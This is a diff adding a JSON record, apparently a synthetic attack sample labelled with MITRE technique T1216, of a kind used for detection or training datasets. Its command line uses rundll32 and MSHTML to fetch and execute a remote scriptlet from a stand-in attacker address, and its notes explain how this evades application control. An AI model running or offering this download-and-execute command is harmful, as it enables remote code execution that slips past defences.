@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:https://198.51.100.10/payload.sct\")",
+  "explanation": "Uses rundll32 to invoke MSHTML's RunHTMLApplication as a script proxy, which then loads and executes a remote scriptlet via the script: moniker. This relies on signed, native components to proxy execution, commonly allowed by application control.",
+  "rationale_steps": [
+    "From PowerShell, launch rundll32 with the javascript handler to reach MSHTML's RunHTMLApplication export.",
+    "Within the JScript context, use GetObject with the script: moniker to fetch and execute a remote .sct scriptlet.",
+    "Execution runs under user context and leverages trusted binaries, aiding control bypass and limiting detections to unusual parameter usage."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-784933d5",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
